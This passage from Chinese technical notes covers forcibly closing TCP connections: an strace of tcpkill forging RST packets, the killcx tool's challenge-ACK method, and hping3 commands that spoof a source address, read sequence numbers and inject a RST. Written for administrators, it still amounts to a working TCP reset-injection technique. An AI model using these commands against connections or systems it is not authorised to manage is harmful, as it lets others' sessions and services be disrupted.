16:31:35.688347 brk(0x1f11000)          = 0x1f11000 <0.000013>
16:31:35.688381 brk(NULL)               = 0x1f11000 <0.000011>
16:31:35.688422 setsockopt(3, SOL_SOCKET, SO_ATTACH_FILTER, "\1\0\0\0\0\0\0\0\300V\227\371\31\177\0\0", 16) = 0 <0.000214>
16:31:35.688662 fcntl(3, F_GETFL)       = 0x2 (flags O_RDWR) <0.000011>
16:31:35.688695 fcntl(3, F_SETFL, O_RDWR|O_NONBLOCK) = 0 <0.000011>
16:31:35.688727 recvfrom(3, 0x7fff979dc8b7, 1, MSG_TRUNC, NULL, NULL) = -1 EAGAIN (Resource temporarily unavailable) <0.000011>
16:31:35.688761 fcntl(3, F_SETFL, O_RDWR) = 0 <0.000010>
16:31:35.688792 setsockopt(3, SOL_SOCKET, SO_ATTACH_FILTER, "\30\0\0\0\0\0\0\0\220\314\356\1\0\0\0\0", 16) = 0 <0.000080>
16:31:35.688989 socket(AF_INET, SOCK_RAW, IPPROTO_RAW) = 4 <0.000015>
16:31:35.689026 setsockopt(4, SOL_IP, IP_HDRINCL, [1], 4) = 0 <0.000011>
16:31:35.689060 getsockopt(4, SOL_SOCKET, SO_SNDBUF, [262144000], [4]) = 0 <0.000011>
16:31:35.689093 setsockopt(4, SOL_SOCKET, SO_BROADCAST, [262144128], 4) = 0 <0.000011>
16:31:35.689140 write(2, "tcpkill: ", 9tcpkill: ) = 9 <0.000017>
16:31:35.689179 write(2, "listening on eth03 [port 41754]", 31listening on eth03 [port 41754]) = 31 <0.000013>
16:31:35.689213 write(2, "\n", 1
)       = 1 <0.000012>
16:31:35.689250 poll([{fd=3, events=POLLIN}], 1, 512) = 0 (Timeout) <0.512533>
16:31:36.201809 poll([{fd=3, events=POLLIN}], 1, 512) = 0 (Timeout) <0.512540>
16:31:36.714390 poll([{fd=3, events=POLLIN}], 1, 512) = 0 (Timeout) <0.512539>
16:31:37.226976 poll([{fd=3, events=POLLIN}], 1, 512) = 0 (Timeout) <0.512537>
16:31:37.739557 poll([{fd=3, events=POLLIN}], 1, 512) = 0 (Timeout) <0.512542>
16:31:38.252146 poll([{fd=3, events=POLLIN}], 1, 512) = 0 (Timeout) <0.512533>
16:31:38.764719 poll([{fd=3, events=POLLIN}], 1, 512) = 0 (Timeout) <0.512542>
16:31:39.277292 poll([{fd=3, events=POLLIN}], 1, 512) = 0 (Timeout) <0.512545>
16:31:39.789873 poll([{fd=3, events=POLLIN}], 1, 512) = 0 (Timeout) <0.512532>
16:31:40.302443 poll([{fd=3, events=POLLIN}], 1, 512) = 0 (Timeout) <0.512540>
16:31:40.815019 poll([{fd=3, events=POLLIN}], 1, 512) = 0 (Timeout) <0.512533>
16:31:41.327591 poll([{fd=3, events=POLLIN}], 1, 512) = 0 (Timeout) <0.512532>
16:31:41.840152 poll([{fd=3, events=POLLIN}], 1, 512) = 1 ([{fd=3, revents=POLLIN}]) <0.172401>
16:31:42.012640 sendto(4, "E\0\0(80\0\0@\6\266j\300\25\5\n\300\25\7\1\0P\243\32\302\265\211\354\0\0\0\0"..., 40, 0, {sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr("192.21.7.1")}, 16) = 40 <0.000029>
16:31:42.012705 write(2, "192.21.7.1:41754 > 192.21.5.10:8"..., 68192.21.7.1:41754 > 192.21.5.10:80: R 3266677228:3266677228(0) win 0
) = 68 <0.000018>
16:31:42.012750 sendto(4, "E\0\0(]\33\0\0@\6\221\177\300\25\5\n\300\25\7\1\0P\243\32\302\265\212\321\0\0\0\0"..., 40, 0, {sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr("192.21.7.1")}, 16) = 40 <0.000015>
16:31:42.012791 write(2, "192.21.7.1:41754 > 192.21.5.10:8"..., 68192.21.7.1:41754 > 192.21.5.10:80: R 3266677457:3266677457(0) win 0
) = 68 <0.000024>
16:31:42.012845 sendto(4, "E\0\0(1\265\0\0@\6\274\345\300\25\5\n\300\25\7\1\0P\243\32\302\265\214\233\0\0\0\0"..., 40, 0, {sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr("192.21.7.1")}, 16) = 40 <0.000018>
16:31:42.012896 write(2, "192.21.7.1:41754 > 192.21.5.10:8"..., 68192.21.7.1:41754 > 192.21.5.10:80: R 3266677915:3266677915(0) win 0
) = 68 <0.000018>
16:31:42.012940 sendto(4, "E\0\0(\307\301\0\0@\6&\331\300\25\7\1\300\25\5\n\243\32\0P\26C\323\22\0\0\0\0"..., 40, 0, {sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr("192.21.5.10")}, 16) = 40 <0.000026>
16:31:42.012993 write(2, "192.21.5.10:80 > 192.21.7.1:4175"..., 66192.21.5.10:80 > 192.21.7.1:41754: R 373543698:373543698(0) win 0
) = 66 <0.000014>
16:31:42.013031 sendto(4, "E\0\0(\305\364\0\0@\6(\246\300\25\7\1\300\25\5\n\243\32\0P\26C\323\367\0\0\0\0"..., 40, 0, {sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr("192.21.5.10")}, 16) = 40 <0.000017>
16:31:42.013073 write(2, "192.21.5.10:80 > 192.21.7.1:4175"..., 66192.21.5.10:80 > 192.21.7.1:41754: R 373543927:373543927(0) win 0
) = 66 <0.000015>
16:31:42.013112 sendto(4, "E\0\0(\226\306\0\0@\6W\324\300\25\7\1\300\25\5\n\243\32\0P\26C\325\301\0\0\0\0"..., 40, 0, {sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr("192.21.5.10")}, 16) = 40 <0.000016>
16:31:42.013153 write(2, "192.21.5.10:80 > 192.21.7.1:4175"..., 66192.21.5.10:80 > 192.21.7.1:41754: R 373544385:373544385(0) win 0
) = 66 <0.000015>
16:31:42.013193 sendto(4, "E\0\0(,\367\0\0@\6\301\243\300\25\7\1\300\25\5\n\243\32\0P\26C\323\22\0\0\0\0"..., 40, 0, {sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr("192.21.5.10")}, 16) = 40 <0.000016>
16:31:42.013233 write(2, "192.21.5.10:80 > 192.21.7.1:4175"..., 66192.21.5.10:80 > 192.21.7.1:41754: R 373543698:373543698(0) win 0
) = 66 <0.000015>
16:31:42.013272 sendto(4, "E\0\0(\367\255\0\0@\6\366\354\300\25\7\1\300\25\5\n\243\32\0P\26C\323\367\0\0\0\0"..., 40, 0, {sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr("192.21.5.10")}, 16) = 40 <0.000016>
16:31:42.013312 write(2, "192.21.5.10:80 > 192.21.7.1:4175"..., 66192.21.5.10:80 > 192.21.7.1:41754: R 373543927:373543927(0) win 0
) = 66 <0.000015>
16:31:42.013350 sendto(4, "E\0\0(1Y\0\0@\6\275A\300\25\7\1\300\25\5\n\243\32\0P\26C\325\301\0\0\0\0"..., 40, 0, {sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr("192.21.5.10")}, 16) = 40 <0.000016>
16:31:42.013392 write(2, "192.21.5.10:80 > 192.21.7.1:4175"..., 66192.21.5.10:80 > 192.21.7.1:41754: R 373544385:373544385(0) win 0
) = 66 <0.000014>
16:31:42.013431 sendto(4, "E\0\0(|\201\0\0@\6r\31\300\25\5\n\300\25\7\1\0P\243\32\302\265\213!\0\0\0\0"..., 40, 0, {sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr("192.21.7.1")}, 16) = 40 <0.000014>
16:31:42.013470 write(2, "192.21.7.1:41754 > 192.21.5.10:8"..., 68192.21.7.1:41754 > 192.21.5.10:80: R 3266677537:3266677537(0) win 0
) = 68 <0.000014>
16:31:42.013508 sendto(4, "E\0\0(\260\206\0\0@\6>\24\300\25\5\n\300\25\7\1\0P\243\32\302\265\214\16\0\0\0\0"..., 40, 0, {sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr("192.21.7.1")}, 16) = 40 <0.000013>
16:31:42.013546 write(2, "192.21.7.1:41754 > 192.21.5.10:8"..., 68192.21.7.1:41754 > 192.21.5.10:80: R 3266677774:3266677774(0) win 0
) = 68 <0.000014>
16:31:42.013585 sendto(4, "E\0\0(k\317\0\0@\6\202\313\300\25\5\n\300\25\7\1\0P\243\32\302\265\215\350\0\0\0\0"..., 40, 0, {sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr("192.21.7.1")}, 16) = 40 <0.000014>
16:31:42.013623 write(2, "192.21.7.1:41754 > 192.21.5.10:8"..., 68192.21.7.1:41754 > 192.21.5.10:80: R 3266678248:3266678248(0) win 0
) = 68 <0.000014>
16:31:42.013662 sendto(4, "E\0\0(\206\204\0\0@\6h\26\300\25\7\1\300\25\5\n\243\32\0P\26C\323\23\0\0\0\0"..., 40, 0, {sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr("192.21.5.10")}, 16) = 40 <0.000016>
16:31:42.013703 write(2, "192.21.5.10:80 > 192.21.7.1:4175"..., 66192.21.5.10:80 > 192.21.7.1:41754: R 373543699:373543699(0) win 0
) = 66 <0.000014>
16:31:42.013741 sendto(4, "E\0\0(\\\250\0\0@\6\221\362\300\25\7\1\300\25\5\n\243\32\0P\26C\323\370\0\0\0\0"..., 40, 0, {sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr("192.21.5.10")}, 16) = 40 <0.000016>
16:31:42.013782 write(2, "192.21.5.10:80 > 192.21.7.1:4175"..., 66192.21.5.10:80 > 192.21.7.1:41754: R 373543928:373543928(0) win 0
) = 66 <0.000014>
16:31:42.013823 sendto(4, "E\0\0(y\t\0\0@\6u\221\300\25\7\1\300\25\5\n\243\32\0P\26C\325\302\0\0\0\0"..., 40, 0, {sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr("192.21.5.10")}, 16) = 40 <0.000016>
16:31:42.013864 write(2, "192.21.5.10:80 > 192.21.7.1:4175"..., 66192.21.5.10:80 > 192.21.7.1:41754: R 373544386:373544386(0) win 0
) = 66 <0.000014>
16:31:42.013902 poll([{fd=3, events=POLLIN}], 1, 512) = 0 (Timeout) <0.512536>
16:31:42.526468 poll([{fd=3, events=POLLIN}], 1, 512) = 0 (Timeout) <0.512538>
16:31:43.039048 poll([{fd=3, events=POLLIN}], 1, 512) = 0 (Timeout) <0.512547>
16:31:43.551646 poll([{fd=3, events=POLLIN}], 1, 512) = 0 (Timeout) <0.512535>
16:31:44.064224 poll([{fd=3, events=POLLIN}], 1, 512) = 0 (Timeout) <0.512534>
16:31:44.576786 poll([{fd=3, events=POLLIN}], 1, 512) = 0 (Timeout) <0.512530>
16:31:45.089344 poll([{fd=3, events=POLLIN}], 1, 512) = 0 (Timeout) <0.512537>
16:31:45.601915 poll([{fd=3, events=POLLIN}], 1, 512) = 0 (Timeout) <0.512530>
16:31:46.114484 poll([{fd=3, events=POLLIN}], 1, 512) = 0 (Timeout) <0.512535>
16:31:46.627051 poll([{fd=3, events=POLLIN}], 1, 512) = ? ERESTART_RESTARTBLOCK (Interrupted by signal) <0.169899>
16:31:46.796990 --- SIGWINCH {si_signo=SIGWINCH, si_code=SI_KERNEL} ---
16:31:46.797015 restart_syscall(<... resuming interrupted poll ...>) = 0 <0.342420>
16:31:47.139468 poll([{fd=3, events=POLLIN}], 1, 512) = ? ERESTART_RESTARTBLOCK (Interrupted by signal) <0.185179>
16:31:47.324687 --- SIGWINCH {si_signo=SIGWINCH, si_code=SI_KERNEL} ---
16:31:47.324708 restart_syscall(<... resuming interrupted poll ...>) = ? ERESTART_RESTARTBLOCK (Interrupted by signal) <0.241902>
16:31:47.566634 --- SIGWINCH {si_signo=SIGWINCH, si_code=SI_KERNEL} ---
16:31:47.566653 restart_syscall(<... resuming interrupted restart_syscall ...>) = 0 <0.084935>
16:31:47.651611 poll([{fd=3, events=POLLIN}], 1, 512) = 0 (Timeout) <0.512545>
16:31:48.164195 poll([{fd=3, events=POLLIN}], 1, 512^Cstrace: Process 31548 detached
 <detached ...>
```

## killcx工具
### 原理
正如我们最开始学到的，如果处于 Established 状态的服务端，收到四元组相同的 SYN 报文后，**会回复一个 Challenge ACK，这个 ACK 报文里的「确认号」，正好是服务端下一次想要接收的序列号，说白了，就是可以通过这一步拿到服务端下一次预期接收的序列号。**

**然后用这个确认号作为 RST 报文的序列号，发送给服务端，此时服务端会认为这个 RST 报文里的序列号是合法的，于是就会释放连接！**

在 Linux 上有个叫 killcx 的工具，就是基于上面这样的方式实现的，它会主动发送 SYN 包获取 SEQ/ACK 号，然后利用 SEQ/ACK 号伪造两个 RST 报文分别发给客户端和服务端，这样双方的 TCP 连接都会被释放，这种方式活跃和非活跃的 TCP 连接都可以杀掉。

### 使用
killcx 的工具使用方式也很简单，如果在服务端执行 killcx 工具，只需指明客户端的 IP 和端口号，如果在客户端执行 killcx 工具，则就指明服务端的 IP 和端口号。
```
./killcx <IP地址>:<端口号>
```
killcx 工具的工作原理，如下图：
![](attachments/Pasted%20image%2020231113150454.png)

### 流程
它伪造客户端发送 SYN 报文，服务端收到后就会回复一个携带了正确「序列号和确认号」的 ACK 报文（Challenge ACK），然后就可以利用这个 ACK 报文里面的信息，伪造两个 RST 报文：

- 用 Challenge ACK 里的确认号伪造 RST 报文发送给服务端，服务端收到 RST 报文后就会释放连接。
- 用 Challenge ACK 里的序列号伪造 RST 报文发送给客户端，客户端收到 RST 也会释放连接。
正是通过这样的方式，成功将一个 TCP 连接关闭了！

==这种方式活跃和非活跃的 TCP 连接都可以杀掉==。

### 安装
因为Killcx是perl脚本，它运行依赖三个Perl模块，分别是Net::RawIp、Net::PCAP、NetPacket::Ethernet，这几个模块的安装很简单
```c
# 通过yum先安装perl-CPAN
yum -y install perl-CPAN
# 利用CPAN安装三个模块
perl -MCPAN -e shell
cpan> install Net::RawIP
cpan> install Net::Pcap
cpan> install NetPacket::Ethernet
```

## 使用hping3杀死空闲的TCP连接
hping3命令可以发任何类型的TCP包，因此只要模拟tcpkill的原理即可，如下：

1. 通过发送SYN包来获取seq

上面提到了，TCP协议会直接丢弃乱序的数据包，但是对于SYN包却区别对待了，如果你随便发一个SYN包给已连接状态的Socket，它会回复一个challege ACK，并携带有正确的seq序列号，如下：
```bash
# 第一个参数，表示发送包的目标ip地址
# -a：设置包的源ip地址
# -s：设置包的源端口
# -p：设置包的目标端口
# --syn：表示发SYN包
# -V：verbose output，使hping3输出序列号seq
# -c：设置发包数量
$ sudo hping3 172.26.79.103 -a 192.168.18.230 -s 8080 -p 45316 --syn -V -c 1
using eth0, addr: 172.26.79.103, MTU: 1500
HPING 172.26.79.103 (eth0 172.26.79.103): S set, 40 headers + 0 data bytes
len=40 ip=172.26.79.103 ttl=64 DF id=16518 tos=0 iplen=40
sport=45316 flags=A seq=0 win=502 rtt=13.4 ms
seq=1179666991 ack=1833836153 sum=2acf urp=0
```
可以在输出中找到，`ack=1833836153`即是对方回复的序列号，我们用在后面的发RST包中。

使用seq发RST包：
```bash
# --rst：表示发RST包
# --win：设置TCP窗口大小
# --setseq：设置包的seq序列包
$ sudo hping3 172.26.79.103 -a 192.168.18.230 -s 8080 -p 45316 --rst --win 0 --setseq 1833836153 -c 1
HPING 172.26.79.103 (eth0 172.26.79.103): R set, 40 headers + 0 data bytes

--- 172.26.79.103 hping statistic ---
1 packets transmitted, 0 packets received, 100% packet loss
round-trip min/avg/max = 0.0/0.0/0.0 ms
```

整个过程如下：
![](attachments/Pasted%20image%2020230927143348.png)


# 参考
```c
https://taohui.blog.csdn.net/article/details/7228923

文章不错：
https://icloudnative.io/posts/how-does-a-tcp-reset-attack-work/

杀死一条tcp链接
https://zhuanlan.zhihu.com/p/578506067
```